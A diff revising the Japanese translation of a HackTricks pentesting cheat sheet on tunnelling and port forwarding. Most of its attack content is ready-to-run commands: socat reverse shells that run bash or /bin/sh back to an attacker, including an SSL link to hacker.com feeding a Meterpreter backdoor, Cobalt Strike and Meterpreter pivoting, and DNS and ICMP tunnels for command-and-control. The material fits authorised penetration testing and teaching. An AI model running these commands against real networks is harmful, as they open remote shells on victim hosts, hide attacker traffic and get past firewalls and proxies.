@@ -1,16 +1,19 @@
 # トンネリングとポートフォワーディング
 
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れます
-* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -23,12 +26,12 @@
 ## Nmapのヒント
 
 {% hint style="warning" %}
-**ICMP**および**SYN**スキャンはソックスプロキシを介してトンネリングすることはできませんので、これを機能させるには**ping discoveryを無効に**（`-Pn`）し、**TCPスキャン**（`-sT`）を指定する必要があります。
+**ICMP**および**SYN**スキャンはソックスプロキシを通じてトンネリングできないため、**pingディスカバリーを無効にする**（`-Pn`）必要があり、**TCPスキャン**（`-sT`）を指定する必要があります。
 {% endhint %}
 
 ## **Bash**
 
-**ホスト -> ジャンプ -> 内部A -> 内部B**
+**ホスト -> ジャンプ -> InternalA -> InternalB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -46,11 +49,11 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-SSHグラフィカル接続（X）
+SSHグラフィカル接続 (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### ローカルポートツーポート
+### Local Port2Port
 
 SSHサーバーで新しいポートを開く --> 他のポート
 ```bash
@@ -60,9 +63,9 @@ ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in
 ```bash
 ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
 ```
-### ポートツーポート
+### Port2Port
 
-ローカルポート --> 侵害されたホスト（SSH） --> 第三のボックス：ポート
+ローカルポート --> 侵害されたホスト (SSH) --> 第三\_ボックス:ポート
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -70,13 +73,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-ローカルポート --> 危険にさらされたホスト（SSH） --> どこでも
+ローカルポート --> 侵害されたホスト (SSH) --> どこでも
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 ### リバースポートフォワーディング
 
-これは、内部ホストから DMZ を介してホストにリバースシェルを取得するために役立ちます。
+これは、DMZを通じて内部ホストからあなたのホストへのリバースシェルを取得するのに役立ちます：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
@@ -85,9 +88,9 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
 # to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
 ```
-### VPNトンネル
+### VPN-Tunnel
 
-両方のデバイスで**root権限**が必要です（新しいインターフェースを作成するため）そしてsshdの設定でrootログインを許可する必要があります:\
+両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）およびsshdの設定でrootログインを許可する必要があります：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -97,40 +100,38 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-サーバーサイドで転送を有効にします。
+サーバー側で転送を有効にする
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-クライアント側で新しいルートを設定します。
+クライアント側に新しいルートを設定する
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-**SSHUTTLE**を使用して、ホストを介してサブネットワークへのすべてのトラフィックを**SSH**経由で**トンネリング**できます。\
-たとえば、10.10.10.0/24に向かうすべてのトラフィックを転送する場合
+あなたは**ssh**を介してホストを通じて**サブネット**へのすべての**トラフィック**を**トンネル**することができます。\
+例えば、10.10.10.0/24へのすべてのトラフィックを転送すること。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-プライベートキーを使用して接続します。
+プライベートキーで接続する
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
 ```
 ## Meterpreter
 
-### ポートツーポート
+### Port2Port
 
-ローカルポート --> 侵害されたホスト（アクティブセッション） --> サードボックス:ポート
+ローカルポート --> 侵害されたホスト (アクティブセッション) --> 第三\_ボックス:ポート
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
-
-SOCKS（Socket Secure）は、ネットワークソケットを通じてトラフィックを転送するためのプロトコルです。通常、ファイアウォールをバイパスするために使用されます。
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -138,7 +139,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-もう一つの方法：
+別の方法：
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -153,9 +154,9 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ## Cobalt Strike
 
-### SOCKS proxy
+### SOCKSプロキシ
 
-**ビーコンを介してトラフィックをルーティング**するために使用できるすべてのインターフェースでリッスンしているチームサーバーでポートを開きます。
+すべてのインターフェースでリッスンしているチームサーバーにポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -166,16 +167,22 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-この場合、**ポートはビーコンホストで開かれ**、チームサーバーではなく、そこから指定されたホスト:ポートにトラフィックが送信されます。
+この場合、**ポートはビーコーンホストで開かれます**、チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送られます。
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-### rPort2Port ローカル
+To note:
+
+- Beaconのリバースポートフォワードは、**個々のマシン間の中継ではなく、Team Serverへのトラフィックをトンネリングするために設計されています**。
+- トラフィックは**BeaconのC2トラフィック内でトンネリングされます**、P2Pリンクを含みます。
+- **管理者権限は必要ありません** 高ポートでリバースポートフォワードを作成するために。
+
+### rPort2Port local
 
 {% hint style="warning" %}
-この場合、**ポートはビーコンホストで開かれ**、チームサーバーではなく**トラフィックはCobalt Strikeクライアントに送信**され、そこから指定されたホスト:ポートに送信されます。
+この場合、**ポートはbeaconホストで開かれます**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信されます**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -185,14 +192,14 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Webファイルトンネルをアップロードする必要があります：ashx|aspx|js|jsp|php|php|jsp
+ウェブファイルトンネルをアップロードする必要があります: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)のリリースページからダウンロードできます。\
-**クライアントとサーバーで同じバージョンを使用する必要があります**
+**クライアントとサーバーで同じバージョンを使用する必要があります。**
 
 ### socks
 ```bash
@@ -203,7 +210,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### ポート転送
+### ポートフォワーディング
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -213,7 +220,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 リバーストンネル。トンネルは被害者から開始されます。\
-127.0.0.1:1080 に socks4 プロキシが作成されます。
+127.0.0.1:1080にsocks4プロキシが作成されます。
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -221,7 +228,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-**NTLMプロキシ**を介してピボット
+**NTLMプロキシ**を介してピボットする
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -243,15 +250,15 @@ attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
-### ポートツーポート
+### Port2Port
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### ソックスを介したポートツーポート
+### Port2Port through socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### SSLソケットを介したMeterpreter
+### MeterpreterをSSL Socat経由で
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -261,17 +268,17 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-あなたは、被害者のコンソールで最後の行の代わりにこの行を実行することで、**非認証プロキシ**をバイパスすることができます：
+あなたは被害者のコンソールで最後の行の代わりにこの行を実行することで**非認証プロキシ**をバイパスできます：
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat Tunnel
+### SSL Socat トンネル
 
 **/bin/sh コンソール**
 
-両側で証明書を作成します：クライアントとサーバー
+クライアントとサーバーの両方で証明書を作成します。
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -285,9 +292,9 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### リモートポートツーポート
+### Remote Port2Port
 
-ローカルのSSHポート（22）を攻撃者ホストの443ポートに接続します。
+ローカルSSHポート（22）を攻撃者ホストの443ポートに接続します。
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -295,18 +302,18 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-これはコンソール版のPuTTYのようなものです（オプションはsshクライアントに非常に似ています）。
+コンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）。
 
-このバイナリは被害者で実行されるため、sshクライアントであるため、逆接続を持つためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを私たちのマシンのポートにフォワーディングするだけです：
+このバイナリは被害者のコンピュータで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを私たちのマシンのポートに転送するには：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
 ## Windows netsh
 
-### ポートツーポート
+### Port2Port
 
-任意のポートに対してローカル管理者である必要があります。
+ローカル管理者である必要があります（任意のポートについて）
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -318,20 +325,20 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-**システム上でのRDPアクセスが必要です。**\
+**システムへのRDPアクセスが必要です**。\
 ダウンロード:
 
-1. [SocksOverRDP x64 バイナリ](https://github.com/nccgroup/SocksOverRDP/releases) - このツールはWindowsのRemote Desktop Service機能から`Dynamic Virtual Channels` (`DVC`)を使用します。 DVCは**RDP接続を介してパケットをトンネリング**する責任があります。
+1. [SocksOverRDP x64 バイナリ](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、Windowsのリモートデスクトップサービス機能からの`Dynamic Virtual Channels`（`DVC`）を使用します。DVCは**RDP接続を介してパケットをトンネリングする**役割を担っています。
 2. [Proxifier ポータブルバイナリ](https://www.proxifier.com/download/#win-tab)
 
-クライアントコンピューターで**`SocksOverRDP-Plugin.dll`**をロードします。
+クライアントコンピュータで**`SocksOverRDP-Plugin.dll`**を次のように読み込みます:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Now we can **connect** to the **victim** over **RDP** using **`mstsc.exe`**, and we should receive a **prompt** saying that the **SocksOverRDP plugin is enabled**, and it will **listen** on **127.0.0.1:1080**.
+今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** することになります。
 
-**Connect** via **RDP** and upload & execute in the victim machine the `SocksOverRDP-Server.exe` binary:
+**RDP** 経由で **接続** し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -339,18 +346,18 @@ C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
 netstat -antb | findstr 1080
 ```
-Now you can use [**Proxifier**](https://www.proxifier.com/) **to proxy the traffic through that port.**
+今、[**Proxifier**](https://www.proxifier.com/) **を使用してそのポートを通じてトラフィックをプロキシできます。**
 
-## Proxify Windows GUI Apps
+## Windows GUIアプリをプロキシ化する
 
-Windows GUIアプリをプロキシ経由で操作するには、[**Proxifier**](https://www.proxifier.com/) を使用できます。\
+[**Proxifier**](https://www.proxifier.com/)を使用して、Windows GUIアプリがプロキシを通じてナビゲートできるようにします。\
 **Profile -> Proxy Servers** でSOCKSサーバーのIPとポートを追加します。\
-**Profile -> Proxification Rules** でプロキシを適用するプログラム名とプロキシを適用したいIPへの接続を追加します。
+**Profile -> Proxification Rules** でプロキシ化するプログラムの名前とプロキシ化したいIPへの接続を追加します。
 
-## NTLM proxy bypass
+## NTLMプロキシバイパス
 
-先述のツール: **Rpivot**\
-**OpenVPN** もこれをバイパスでき、構成ファイルで次のオプションを設定します:
+前述のツール: **Rpivot**\
+**OpenVPN** もこれをバイパスでき、設定ファイルにこれらのオプションを設定します:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -358,8 +365,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-プロキシに対して認証し、指定した外部サービスに転送されるローカルポートをバインドします。その後、このポートを介して選択したツールを使用できます。\
-たとえば、ポート443を転送します。
+プロキシに対して認証を行い、指定した外部サービスに転送されるローカルポートをバインドします。これにより、このポートを介してお好みのツールを使用できます。\
+例えば、ポート443を転送します。
 ```
 Username Alice
 Password P@ssw0rd
@@ -367,34 +374,34 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\
-You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.
+今、例えば被害者の**SSH**サービスをポート443でリッスンするように設定した場合、攻撃者はポート2222を通じて接続できます。\
+また、**meterpreter**を使用してlocalhost:443に接続し、攻撃者がポート2222でリッスンしていることも可能です。
 
 ## YARP
 
-A reverse proxy created by Microsoft. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoftによって作成されたリバースプロキシです。こちらで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
-## DNS Tunneling
+## DNSトンネリング
 
 ### Iodine
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is needed in both systems to create tun adapters and tunnel data between them using DNS queries.
+DNSクエリを使用してトンネルデータを作成するためには、両方のシステムでroot権限が必要です。
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-トンネルは非常に遅くなります。次の方法を使用して、このトンネルを介して圧縮されたSSH接続を作成できます：
+トンネルは非常に遅くなります。このトンネルを通じて圧縮されたSSH接続を作成するには、次のようにします:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**ここからダウンロードしてください**](https://github.com/iagox86/dnscat2)**.**
+[**ここからダウンロード**](https://github.com/iagox86/dnscat2)**.**
 
-DNSを介してC\&Cチャネルを確立します。ルート権限は必要ありません。
+DNSを通じてC\&Cチャネルを確立します。ルート権限は必要ありません。
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -403,21 +410,21 @@ victim> ./dnscat2 tunneldomain.com
 attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
 victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
-#### **PowerShell**
+#### **PowerShellで**
 
 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用して、PowerShellでdnscat2クライアントを実行できます：
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **dnscatを使用したポート転送**
+#### **dnscatを使用したポートフォワーディング**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### プロキシチェーンのDNSの変更
+#### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libc呼び出しを傍受し、tcp DNSリクエストをソックスプロキシを介してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコードされています）。変更するには、ファイルを編集します：_/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -430,7 +437,7 @@ Proxychainsは`gethostbyname` libc呼び出しを傍受し、tcp DNSリクエス
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-両方のシステムでルート権限が必要で、tunアダプタを作成し、ICMPエコーリクエストを使用してそれらの間でデータをトンネリングするために必要です。
+両方のシステムでルート権限が必要で、tunアダプタを作成し、ICMPエコーリクエストを使用してデータをトンネリングします。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -438,7 +445,7 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 ```
 ### ptunnel-ng
 
-[**ここからダウンロードしてください**](https://github.com/utoni/ptunnel-ng.git).
+[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git).
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -454,8 +461,8 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/)は、1つのコマンドラインでインターネットにソリューションを公開するためのツールです。**
-*エクスポージョンURIは次のようになります:* **UID.ngrok.io**
+**[ngrok](https://ngrok.com/) は、1つのコマンドラインでソリューションをインターネットに公開するためのツールです。**
+*公開URIは次のようになります:* **UID.ngrok.io**
 
 ### インストール
 
@@ -471,7 +478,7 @@ chmod a+x ./ngrok
 
 **ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*必要に応じて、認証およびTLSを追加することも可能です。*
+*必要に応じて、認証とTLSを追加することも可能です。*
 
 #### TCPトンネリング
 ```bash
@@ -481,15 +488,15 @@ chmod a+x ./ngrok
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### HTTPを使用してファイルを公開
+#### HTTPを使用してファイルを公開する
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
 #### HTTPコールのスニッフィング
 
-*XSS、SSRF、SSTIなどに便利...*
-標準出力から直接またはHTTPインターフェース[http://127.0.0.1:4040](http://127.0.0.1:4000)で。 
+*XSS、SSRF、SSTIに便利...*
+stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:4040](http://127.0.0.1:4000) で。
 
 #### 内部HTTPサービスのトンネリング
 ```bash
@@ -498,11 +505,11 @@ chmod a+x ./ngrok
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yamlのシンプルな設定例
+#### ngrok.yaml シンプルな設定例
 
 3つのトンネルを開きます：
-- 2つはTCP
-- 1つは/tmp/httpbin/からの静的ファイル公開を行うHTTP
+- 2つのTCP
+- 1つのHTTP、/tmp/httpbin/ からの静的ファイルの公開
 ```yaml
 tunnels:
 mytcp:
@@ -515,7 +522,7 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## その他のチェックするツール
+## その他のチェックツール
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
@@ -528,14 +535,17 @@ addr: file:///tmp/httpbin/
 
 ***
 
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSにアクセス**したいですか？または**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけます
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れます
-* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローします。**
-* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出して、あなたのハッキングトリックを共有してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
+{% endhint %}
